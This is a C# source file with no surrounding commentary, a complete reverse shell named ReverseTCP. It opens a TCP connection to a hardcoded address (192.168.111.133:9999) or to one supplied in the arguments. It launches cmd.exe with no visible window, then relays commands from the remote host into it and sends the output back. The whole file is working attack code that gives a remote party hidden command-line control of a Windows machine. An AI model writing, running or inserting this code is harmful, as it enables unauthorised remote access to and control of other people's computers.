using System;
using System.IO;
using System.Net;
using System.Net.Sockets;
using System.Text;
using System.Diagnostics;

namespace ReflectionEncrypt {
    class ReverseTCP {
        static StreamWriter streamWriter;

        public static void Main(string[] args)
        {
            string ip = "192.168.111.133";
            int port = 9999;

            if (args.Length == 2)
            {
                ip = args[0];
                port = int.Parse(args[1]);
            }

            try
            {
                TcpClient client = new TcpClient(ip, port);
                Stream stream = client.GetStream();
                StreamReader streamReader = new StreamReader(stream);
                streamWriter = new StreamWriter(stream);
                streamWriter.AutoFlush = true;

                Process cmd = new Process();
                cmd.StartInfo.FileName = "cmd.exe";
                cmd.StartInfo.CreateNoWindow = true;
                cmd.StartInfo.UseShellExecute = false;
                cmd.StartInfo.RedirectStandardInput = true;
                cmd.StartInfo.RedirectStandardOutput = true;
                cmd.StartInfo.RedirectStandardError = true;
                cmd.OutputDataReceived += new DataReceivedEventHandler(CmdOutputDataHandler);
                cmd.ErrorDataReceived += new DataReceivedEventHandler(CmdOutputDataHandler);
                cmd.Start();

                streamWriter.WriteLine($"Reverse shell connected to {ip}:{port}");

                cmd.BeginOutputReadLine();
                cmd.BeginErrorReadLine();

                while (true)
                {
                    string command = streamReader.ReadLine();
                    cmd.StandardInput.WriteLine(command);
                }
            }
            catch (Exception ex)
            {
                Console.WriteLine(ex.Message);
            }
        }

        private static void CmdOutputDataHandler(object sendingProcess, DataReceivedEventArgs outLine)
        {
            StringBuilder strOutput = new StringBuilder();

            if (!String.IsNullOrEmpty(outLine.Data))
            {
                try
                {
                    strOutput.Append(outLine.Data);
                    streamWriter.WriteLine(strOutput);
                }
                catch (Exception ex)
                {
                    streamWriter.WriteLine("Error:" + ex.Message);
                }
            }
        }
    }
}